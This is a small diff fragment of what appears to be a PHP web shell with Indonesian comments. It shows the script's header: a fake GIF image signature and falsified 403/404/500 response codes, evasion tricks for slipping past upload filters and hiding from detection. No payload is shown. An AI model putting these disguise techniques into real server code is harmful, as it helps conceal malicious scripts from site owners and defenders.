@@ -11,6 +11,7 @@ echo "<!-- GIF89;a -->\n";
 @http_response_code(403);
 @http_response_code(404);
 @http_response_code(500);
+//Kalau file terbaca sebagai gambar hapus atas ^
 //Shin Code - Created 15 July 2023
 //jan di ganti ganti ntar error aoakwkwk
 //Recode aja  banh penting ga cuma ganti copyright :')
